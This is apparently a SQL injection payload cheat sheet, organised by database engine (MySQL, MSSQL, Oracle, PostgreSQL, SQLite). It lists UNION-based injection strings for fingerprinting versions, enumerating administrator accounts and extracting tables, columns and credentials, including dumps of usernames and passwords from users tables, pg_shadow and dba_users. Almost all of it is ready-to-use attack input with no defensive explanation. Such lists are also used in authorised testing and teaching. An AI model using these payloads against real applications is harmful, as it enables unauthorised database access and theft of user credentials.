# SQL Injection Payloads for Database Enumeration

## Database Version Detection

### MySQL
```sql
' UNION SELECT @@version, NULL-- -
' UNION SELECT version(), NULL-- -
```

Current database name:
```sql
' UNION SELECT database(), NULL-- -
```

### MSSQL
```sql
' UNION SELECT @@version, NULL-- -
```

Current database name:
```sql
' UNION SELECT db_name(), NULL-- -
```

### Oracle
```sql
SELECT * FROM v$version;
SELECT banner FROM v$version;
SELECT version FROM v$instance;
' UNION SELECT banner FROM v$version --
```

### SQLite
```sql
SELECT sqlite_version();
```

### PostgreSQL
```sql
SELECT version();
' UNION SELECT version() --
```

## Database Banner Information

### MySQL
```sql
SELECT @@version_comment;
SELECT VERSION();
SELECT @@global.version_comment;
SELECT @@version_compile_os;
SELECT @@version_compile_machine;
' UNION SELECT @@version_comment --
```

### PostgreSQL
```sql
SELECT version();
SELECT current_setting('server_version');
' UNION SELECT version() --
```

### MSSQL
```sql
SELECT @@VERSION;
SELECT SERVERPROPERTY('ProductVersion');
SELECT SERVERPROPERTY('Edition');
SELECT SERVERPROPERTY('EngineEdition');
' UNION SELECT @@VERSION --
```

### Oracle
```sql
SELECT * FROM v$version;
SELECT banner FROM v$version;
SELECT version FROM v$instance;
' UNION SELECT banner FROM v$version --
```

### SQLite
```sql
SELECT sqlite_version();
PRAGMA database_list;
' UNION SELECT sqlite_version() --
```

## Database Administrator Information

### MySQL
```sql
' UNION SELECT user(), NULL-- -
' UNION SELECT host, user FROM mysql.user-- -       # Users with privileges
' UNION SELECT user FROM mysql.user WHERE Super_priv='Y'-- -
```

### MSSQL
```sql
' UNION SELECT SYSTEM_USER, NULL-- -
' UNION SELECT name FROM master.sys.server_principals WHERE is_disabled = 0 AND type_desc = 'SQL_LOGIN' AND IS_SRVROLEMEMBER('sysadmin', name) = 1-- -  # Admin roles
```

### PostgreSQL
```sql
SELECT usename FROM pg_user;
SELECT current_user;
SELECT session_user;
SELECT user;
' UNION SELECT current_user --
```

### Oracle
```sql
SELECT username FROM all_users;
SELECT user FROM dual;
SELECT sys_context('USERENV', 'CURRENT_USER') FROM dual;
SELECT sys_context('USERENV', 'SESSION_USER') FROM dual;
' UNION SELECT username FROM all_users --
```

### SQLite
```sql
SELECT CURRENT_USER;
SELECT user;
' UNION SELECT CURRENT_USER --
```

## General Data Extraction Payloads

### MySQL
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='TABLE_NAME'-- -
' UNION SELECT username, password FROM users-- -
```

### MSSQL
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables-- -
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='TABLE_NAME'-- -
' UNION SELECT username, password FROM dbo.users-- -
```

### PostgreSQL
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
SELECT column_name FROM information_schema.columns WHERE table_name='users';
SELECT usename, passwd FROM pg_shadow;
SELECT usename FROM pg_user;
```

System information:
```sql
SELECT version();
SELECT current_database();
SELECT inet_server_addr();
```

### Oracle
```sql
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
SELECT username, password FROM dba_users;
SELECT username FROM all_users;
```

System information:
```sql
SELECT * FROM v$version;
SELECT host_name FROM v$instance;
```